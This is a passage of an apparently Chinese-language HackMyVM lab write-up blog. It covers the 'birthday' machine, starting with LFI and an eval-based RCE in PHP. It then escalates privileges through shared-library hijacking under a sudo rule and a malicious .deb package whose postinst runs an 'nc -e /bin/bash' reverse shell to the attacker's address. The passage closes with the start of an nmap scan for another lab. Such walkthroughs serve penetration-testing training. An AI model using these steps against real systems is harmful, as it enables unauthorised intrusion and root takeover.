/.htpasswd.zip        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.htpasswd.php        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.htpasswd.html       <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/index.php            <span class="token punctuation">(</span>Status: <span class="token number">302</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">1197</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> /index.php?event<span class="token operator">=</span>birthday<span class="token operator">&amp;</span><span class="token assign-left variable">date</span><span class="token operator">=</span><span class="token number">3881678400</span><span class="token punctuation">]</span>
/index.php            <span class="token punctuation">(</span>Status: <span class="token number">302</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">1197</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> /index.php?event<span class="token operator">=</span>birthday<span class="token operator">&amp;</span><span class="token assign-left variable">date</span><span class="token operator">=</span><span class="token number">3881678400</span><span class="token punctuation">]</span>
/server-status        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
Progress: <span class="token number">27684</span> / <span class="token number">27690</span> <span class="token punctuation">(</span><span class="token number">99.98</span>%<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<h2 id="查看web"><a href="#查看web" class="headerlink" title="查看web"></a>查看web</h2><p> <img src="https://img2.imgtp.com/2024/04/13/CqB4YxM6.png" align = "left" loading="lazy"> <br /></p>
<p>源码没什么东西，只有一张图片，进行隐写分析后发现并没有什么隐写，唯一利用点只剩url了<br>乱试一通，发现把<code>data</code>改成<code>birthday</code>就跳转到了<code>birthday_party_program.php</code><br> <img src="https://img2.imgtp.com/2024/04/13/JA4rGelu.png" align = "left" loading="lazy">   </p>
<p>每个都点一下试试，发现有一个可能FLI</p>
<p><img src="https://img2.imgtp.com/2024/04/13/alwwueHO.png" align="left" loading="lazy"><br />  </p>
<p><img src="https://img2.imgtp.com/2024/04/13/myz7NE9R.png" align="left" loading="lazy"><br /><br><img src="https://img2.imgtp.com/2024/04/13/c9COFPwN.png" align="left" loading="lazy"><br /></p>
<p>然后下面点击here的时候还会跳转到一个计算生日的url  <br /><br><img src="https://img2.imgtp.com/2024/04/13/xARKIoiU.png" align="left" loading="lazy"><br /> </p>
<p>猜测可以命令执行，就用LFI读一下文件源码  </p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p><a href="http://192.168.56.149/birthday_party_program.php?page=/var/www/html/birthday_calculator.php">http://192.168.56.149/birthday_party_program.php?page=/var/www/html/birthday_calculator.php</a><br><img src="https://img2.imgtp.com/2024/04/13/usdkfaV0.png"  align="left" loading="lazy">  </p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dob'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$dob</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dob'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\$dob = \"<span class="token interpolation"><span class="token variable">$dob</span></span>\";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
                <span class="token variable">$now</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DateTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$nextBirthday</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DateTime</span><span class="token punctuation">(</span><span class="token variable">$dob</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$nextBirthday</span><span class="token operator">-></span><span class="token function">setDate</span><span class="token punctuation">(</span><span class="token variable">$now</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$nextBirthday</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$nextBirthday</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$nextBirthday</span> <span class="token operator">&lt;</span> <span class="token variable">$now</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token variable">$nextBirthday</span><span class="token operator">-></span><span class="token function">modify</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'+1 year'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
 
                <span class="token variable">$interval</span> <span class="token operator">=</span> <span class="token variable">$now</span><span class="token operator">-></span><span class="token function">diff</span><span class="token punctuation">(</span><span class="token variable">$nextBirthday</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>Your next birthday is in: "</span><span class="token operator">.</span><span class="token variable">$interval</span><span class="token operator">-></span><span class="token property">days</span><span class="token operator">.</span><span class="token string double-quoted-string">" days!&lt;/p>"</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token delimiter important">?></span></span></code></pre>
<p>搜索到一篇关于addslashes绕过的文章<br><a href="https://blog.csdn.net/silence1_/article/details/102853517">使用复杂变量绕过addslashes函数实现RCE_eval(‘$str&#x3D;”‘.addslashes($str).’”;’ );-CSDN博客</a><br><img src="https://img2.imgtp.com/2024/04/13/Ew9DrOTJ.png" align="left" loading="lazy"><br /><br><img src="https://img2.imgtp.com/2024/04/13/pu1qVWSA.png" align="left" loading="lazy"><br /></p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nc -lvnp 4567</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.149<span class="token punctuation">]</span> <span class="token number">50338</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span>
python3 <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash")'</span>
www-data@birthday:/var/www/html$ </code></pre>
<h1 id="提权user"><a href="#提权user" class="headerlink" title="提权user"></a>提权user</h1><h2 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h2><p>home下只有一个用户chloe但是无权进入，不过sudo -l可以提升权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@birthday:/var/www$ <span class="token builtin class-name">cd</span> /home
<span class="token builtin class-name">cd</span> /home
www-data@birthday:/home$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">12</span>
drwxr-xr-x  <span class="token number">3</span> root  root  <span class="token number">4096</span> Jun <span class="token number">28</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">18</span> root  root  <span class="token number">4096</span> Jul <span class="token number">14</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
drwx------  <span class="token number">4</span> chloe chloe <span class="token number">4096</span> Jul <span class="token number">14</span>  <span class="token number">2023</span> chloe
www-data@birthday:/home$ <span class="token builtin class-name">cd</span> chloe
<span class="token builtin class-name">cd</span> chloe
bash: cd: chloe: Permission denied
www-data@birthday:/home$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> www-data on birthday:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin,
    use_pty
 
User www-data may run the following commands on birthday:
    <span class="token punctuation">(</span>chloe<span class="token punctuation">)</span> NOPASSWD: /usr/bin/zodiac</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@birthday:/home$ zodiac
zodiac
Please enter your birth month <span class="token punctuation">(</span><span class="token number">1</span>-12<span class="token punctuation">)</span>: <span class="token number">1</span>
<span class="token number">1</span>
Please enter your birth day <span class="token punctuation">(</span><span class="token number">1</span>-31<span class="token punctuation">)</span>: <span class="token number">1</span>
<span class="token number">1</span>
Your Zodiac sign is: Capricorn</code></pre>
<p>是一个计算星座点击脚本,看一下权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@birthday:/usr/bin$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> ./zodiac
<span class="token function">ls</span> <span class="token parameter variable">-al</span> ./zodiac
-rwxr-xr-x <span class="token number">1</span> root root <span class="token number">16056</span> Jun <span class="token number">29</span>  <span class="token number">2023</span> ./zodiac</code></pre>
<p>不能修改，那只能从动态链接库下手了</p>
<h2 id="动态链接库劫持"><a href="#动态链接库劫持" class="headerlink" title="动态链接库劫持"></a>动态链接库劫持</h2><pre class="language-bash" data-language="bash"><code class="language-bash">www-data@birthday:/usr/bin$ ldd ./zodiac
ldd ./zodiac
        linux-vdso.so.1 <span class="token punctuation">(</span>0x00007ffed7d85000<span class="token punctuation">)</span>
        libzodiac.so <span class="token operator">=</span><span class="token operator">></span> /lib/x86_64-linux-gnu/libzodiac.so <span class="token punctuation">(</span>0x00007f8d26467000<span class="token punctuation">)</span>
        libc.so.6 <span class="token operator">=</span><span class="token operator">></span> /lib/x86_64-linux-gnu/libc.so.6 <span class="token punctuation">(</span>0x00007f8d26286000<span class="token punctuation">)</span>
        /lib64/ld-linux-x86-64.so.2 <span class="token punctuation">(</span>0x00007f8d26477000<span class="token punctuation">)</span></code></pre>
<p>能下手的只有libzodiac.so，看一下权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@birthday:/usr/bin$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /lib/x86_64-linux-gnu/libzodiac.so
<span class="token function">ls</span> <span class="token parameter variable">-al</span> /lib/x86_64-linux-gnu/libzodiac.so
-rwxr-xrwx <span class="token number">1</span> root root <span class="token number">15096</span> Jul  <span class="token number">6</span>  <span class="token number">2022</span> /lib/x86_64-linux-gnu/libzodiac.so</code></pre>
<p>可以修改</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@birthday:/tmp$ <span class="token function">cat</span> a.c
<span class="token function">cat</span> a.c
<span class="token comment">#include &lt;stdlib.h></span>
int <span class="token function-name function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        system<span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
www-data@birthday:/tmp$ gcc <span class="token parameter variable">-shared</span> a.c <span class="token parameter variable">-o</span> a.so
gcc <span class="token parameter variable">-shared</span> a.c <span class="token parameter variable">-o</span> a.so
www-data@birthday:/tmp$ <span class="token function">cp</span> a.so /lib/x86_64-linux-gnu/libzodiac.so
<span class="token function">cp</span> a.so /lib/x86_64-linux-gnu/libzodiac.so
www-data@birthday:/tmp$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> www-data on birthday:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin,
    use_pty
 
User www-data may run the following commands on birthday:
    <span class="token punctuation">(</span>chloe<span class="token punctuation">)</span> NOPASSWD: /usr/bin/zodiac
www-data@birthday:/tmp$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> chloe /usr/bin/zodiac
<span class="token function">sudo</span> <span class="token parameter variable">-u</span> chloe /usr/bin/zodiac
Please enter your birth month <span class="token punctuation">(</span><span class="token number">1</span>-12<span class="token punctuation">)</span>: <span class="token number">1</span>
<span class="token number">1</span>
Please enter your birth day <span class="token punctuation">(</span><span class="token number">1</span>-31<span class="token punctuation">)</span>: <span class="token number">1</span>
<span class="token number">1</span>
/usr/bin/zodiac: symbol lookup error: /usr/bin/zodiac: undefined symbol: get_zodiac_sign</code></pre>
<p>写个简单的c发现报错，需要get_zodiac_sign这个函数，那就修改一下exp</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@birthday:/tmp$ <span class="token function">cat</span> a.c
<span class="token function">cat</span> a.c
<span class="token comment">#include &lt;stdlib.h></span>
int <span class="token function-name function">get_zodiac_sign</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
        system<span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
int <span class="token function-name function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        get_zodiac_sign<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
www-data@birthday:/tmp$ gcc <span class="token parameter variable">-shared</span> a.c <span class="token parameter variable">-o</span> a.so
gcc <span class="token parameter variable">-shared</span> a.c <span class="token parameter variable">-o</span> a.so
www-data@birthday:/tmp$ <span class="token function">cp</span> a.so /lib/x86_64-linux-gnu/libzodiac.so
<span class="token function">cp</span> a.so /lib/x86_64-linux-gnu/libzodiac.so
www-data@birthday:/tmp$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> www-data on birthday:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin,
    use_pty
 
User www-data may run the following commands on birthday:
    <span class="token punctuation">(</span>chloe<span class="token punctuation">)</span> NOPASSWD: /usr/bin/zodiac
www-data@birthday:/tmp$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> chloe /usr/bin/zodiac
<span class="token function">sudo</span> <span class="token parameter variable">-u</span> chloe /usr/bin/zodiac
Please enter your birth month <span class="token punctuation">(</span><span class="token number">1</span>-12<span class="token punctuation">)</span>: <span class="token number">1</span>
<span class="token number">1</span>
Please enter your birth day <span class="token punctuation">(</span><span class="token number">1</span>-31<span class="token punctuation">)</span>: <span class="token number">1</span>
<span class="token number">1</span>
chloe@birthday:/tmp$ <span class="token function">id</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>chloe<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>chloe<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>chloe<span class="token punctuation">)</span>
chloe@birthday:/tmp$ </code></pre>
<p>成功拿到chloe的权限</p>
<h1 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h1><p>在opt目录下发现一个脚本，并且所属root</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">chloe@birthday:/opt$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">16</span>
drwxr-xr-x+  <span class="token number">3</span> root root <span class="token number">4096</span> Jul <span class="token number">14</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x  <span class="token number">18</span> root root <span class="token number">4096</span> Jul <span class="token number">14</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
drwxr-xrwx   <span class="token number">2</span> root root <span class="token number">4096</span> Jul  <span class="token number">2</span>  <span class="token number">2023</span> packages
-rwxr-xr-x   <span class="token number">1</span> root root  <span class="token number">357</span> Jul  <span class="token number">2</span>  <span class="token number">2023</span> script.sh
chloe@birthday:/opt$ <span class="token function">cat</span> script.sh
<span class="token function">cat</span> script.sh
<span class="token comment">#!/bin/bash</span>
 
<span class="token assign-left variable">URL</span><span class="token operator">=</span><span class="token string">"http://ipv4.download.thinkbroadband.com/50MB.zip"</span>
 
<span class="token assign-left variable">FILE</span><span class="token operator">=</span><span class="token string">"50MB.zip"</span>
 
<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$FILE</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token function">rm</span> <span class="token string">"<span class="token variable">$FILE</span>"</span>
<span class="token keyword">fi</span>
 
<span class="token assign-left variable">START</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%s.%N<span class="token variable">)</span></span>
<span class="token function">wget</span> <span class="token parameter variable">-O</span> <span class="token variable">$FILE</span> <span class="token variable">$URL</span>
<span class="token assign-left variable">END</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%s.%N<span class="token variable">)</span></span>
 
<span class="token assign-left variable">DIFF</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$END</span> - <span class="token variable">$START</span>"</span> <span class="token operator">|</span> <span class="token function">bc</span><span class="token variable">)</span></span>
 
<span class="token assign-left variable">SIZE</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">du</span> <span class="token parameter variable">-b</span> $FILE <span class="token operator">|</span> <span class="token function">cut</span> <span class="token parameter variable">-f1</span><span class="token variable">)</span></span>
<span class="token assign-left variable">SPEED</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"scale=2; (<span class="token variable">$SIZE</span>*8/1000000)/<span class="token variable">$DIFF</span>"</span> <span class="token operator">|</span> <span class="token function">bc</span><span class="token variable">)</span></span>
 
<span class="token builtin class-name">echo</span> <span class="token string">"Download speed : <span class="token variable">$SPEED</span> Mbps"</span>
 
<span class="token function">rm</span> <span class="token string">"<span class="token variable">$FILE</span>"</span></code></pre>
<p>计算从指定url下载文件所用的时间</p>
<p>用pspy64分析一下</p>
<p>发现&#x2F;usr&#x2F;bin&#x2F;ansible-playbook &#x2F;etc&#x2F;ansible&#x2F;install.yml 会被定时执行<br><code>2024/04/06 05:41:09 CMD: UID=0    PID=25666  | /usr/bin/python3 /usr/bin/ansible-playbook /etc/ansible/install.yml </code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">chloe@birthday:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /etc/ansible/install.yml 
<span class="token function">ls</span> <span class="token parameter variable">-al</span> /etc/ansible/install.yml 
-rw-r--r-- <span class="token number">1</span> root root <span class="token number">1174</span> Jul <span class="token number">13</span>  <span class="token number">2023</span> /etc/ansible/install.yml
chloe@birthday:~$ <span class="token function">cat</span> /etc/ansible/install.yml 
<span class="token function">cat</span> /etc/ansible/install.yml 
- hosts: clients
  tasks:
  
    - name: Run script /opt/script.sh
      ansible.builtin.command: /opt/script.sh
      
    - name: Install debian packages
      ansible.builtin.apt:
        deb: <span class="token string">"/opt/packages/&#123;&#123; item &#125;&#125;"</span>
      loop:
        - abigail-doc_2.2-2_all.deb
        - airspy_1.0.10-2+b1_amd64.deb
        - aobook_1.0.3-3_amd64.deb
        - auto-07p_0.9.2+dfsg-3+b3_amd64.deb
        - bacula-console_9.6.7-7_amd64.deb
      
    - name: Copy /var/www/html to /var/backup/site.zip
      ansible.builtin.archive:
        path: /var/www/html
        dest: /var/backup/site.zip
      
    - name: Check <span class="token function">who</span> is connected
      ansible.builtin.shell: <span class="token function">who</span> <span class="token operator">></span> /tmp/who.txt
        
    - name: Add entry <span class="token keyword">in</span> /etc/hosts
      ansible.builtin.lineinfile:
        path: /etc/hosts
        line: <span class="token string">"127.0.0.1    localhost.me"</span>
        
    - name: Install <span class="token function">apt</span> package
      ansible.builtin.apt:
        name: <span class="token function">htop</span>
        state: present
        
    - name: Install netdata
      ansible.builtin.apt:
        name: netdata
        state: present
 
    - name: Run netdata <span class="token function">service</span>
      ansible.builtin.systemd:
        name: netdata
        enabled: <span class="token function">yes</span>
        state: started</code></pre>
<p> 这是个YAML 格式的 Ansible Playbook 文件</p>
<p>1.执行&#x2F;opt&#x2F;script.sh这个脚本</p>
<p>2.安装&#x2F;opt&#x2F;packages&#x2F;下面的debian包</p>
<p>3.将&#x2F;var&#x2F;www&#x2F;html打包成&#x2F;var&#x2F;backup&#x2F;site.zip</p>
<p>4.执行who的指令，将结果输出到&#x2F;tmp&#x2F;who.txt</p>
<p>5.在&#x2F;etc&#x2F;hosts中将127.0.0.1映射到localhost.me</p>
<p>6.安装htop，netdata，启用netdata服务</p>
<p>利用方式是创建一个可以反弹shell的debian包</p>
<p>这一块我不会直接看wp了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">chloe@birthday:/dev/shm$ <span class="token function">mkdir</span> deb
chloe@birthday:/dev/shm$ <span class="token builtin class-name">cd</span> deb
chloe@birthday:/dev/shm/deb$ <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> package/DEBIAN
chloe@birthday:/dev/shm/deb$ <span class="token function">touch</span> package/DEBIAN/postinst
chloe@birthday:/dev/shm/deb$ <span class="token function">touch</span> package/DEBIAN/control
chloe@birthday:/dev/shm/deb$ <span class="token function">nano</span> package/DEBIAN/postinst
chloe@birthday:/dev/shm/deb$ <span class="token function">nano</span> package/DEBIAN/control
chloe@birthday:/dev/shm/deb$ <span class="token function">cat</span> package/DEBIAN/postinst
<span class="token function">nc</span> <span class="token parameter variable">-e</span> /bin/bash <span class="token number">192.168</span>.56.104 <span class="token number">4444</span>
chloe@birthday:/dev/shm/deb$ <span class="token function">cat</span> package/DEBIAN/control
Package: revshell
Version: <span class="token number">1.0</span>
Architecture: all
Description: revshell
Maintainer: crom
chloe@birthday:/dev/shm/deb$ <span class="token function">chmod</span> +x package/DEBIAN/postinst
chloe@birthday:/dev/shm/deb$ dpkg-deb <span class="token parameter variable">--build</span> package
chloe@birthday:/dev/shm/deb$ <span class="token function">mv</span> package.deb /opt/packages/aobook_1.0.3-3_amd64.deb
replace <span class="token string">'/opt/packages/aobook_1.0.3-3_amd64.deb'</span>, overriding mode 0644 <span class="token punctuation">(</span>rw-r--r--<span class="token punctuation">)</span>? y
 </code></pre>
<p>kali开个监听就能拿到root</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nc -lvnp 4444</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4444</span> <span class="token punctuation">..</span>.
<span class="token function">id</span>
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.149<span class="token punctuation">]</span> <span class="token number">51688</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
<span class="token function">cat</span> /root/r*</code></pre>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>动态链接库劫持</tag>
        <tag>LFI</tag>
        <tag>RCE</tag>
        <tag>Ansible Playbook</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Apaches</title>
    <url>/posts/724f9cb4/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.159</strong><br>做起来超顺手的一个靶场</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.159 -sV -A </span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-04-23 <span class="token number">18</span>:10 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.159
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00041s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.2p1 Ubuntu 4ubuntu0.2 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">3072</span> bc:95:83:6e:c4:62:38:b5:a9:94:0c:14:a3:bf:57:34 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> 07:fa:46:1a:ca:f3:dc:08:2f:72:8c:e2:f2:2e:32:e5 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">46</span>:ff:72:d5:67:c5:1f:87:b1:35:84:29:f3:ad:e8:3a <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.49 <span class="token variable"><span class="token punctuation">((</span>Unix<span class="token punctuation">))</span></span>
<span class="token operator">|</span> http-robots.txt: <span class="token number">1</span> disallowed entry 
<span class="token operator">|</span>_/
